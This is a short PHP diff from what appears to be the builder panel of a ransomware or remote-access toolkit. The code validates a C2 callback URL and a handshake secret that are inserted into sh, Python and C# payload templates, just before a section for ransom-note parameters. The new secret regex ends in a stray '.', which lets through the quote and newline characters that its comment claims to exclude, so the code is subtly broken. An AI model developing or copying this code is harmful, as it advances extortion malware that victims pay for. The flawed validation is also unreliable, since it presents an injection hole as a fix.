@@ -20,8 +20,11 @@ $secret   = trim((string)($_POST['secret'] ?? 'jasmin@123'));
 if (!preg_match('#^https?://[A-Za-z0-9._\-]+(:\d{1,5})?(/[A-Za-z0-9._\-]*)*$#', $c2_url)) {
     echo json_encode(['ok'=>false,'msg'=>'回连地址格式不合法（需为 http(s)://主机[:端口][/路径]）']); exit;
 }
-if (!preg_match('/^[A-Za-z0-9_\-]{1,64}$/', $secret)) {
-    echo json_encode(['ok'=>false,'msg'=>'握手密钥只能包含字母、数字、下划线、连字符（1-64 位）']); exit;
+// 允许常见口令字符，但必须排除会破坏载荷模板字符串字面量的字符：
+// ' " ` \ 以及空白/换行 —— 模板里是 SECRET='{{HANDSHAKE}}'（sh/Python）或
+// SECRET="{{HANDSHAKE}}"（C#），放开这些就等于允许注入代码。
+if (!preg_match('/^[A-Za-z0-9_\-@.!$%&*+=]{1,64}.$/', $secret)) {
+    echo json_encode(['ok'=>false,'msg'=>'握手密钥只能包含字母、数字及 - _ @ . ! $ % & * + = （1-64 位，不能有引号/反斜杠/空格）']); exit;
 }
 
 // 勒索信参数
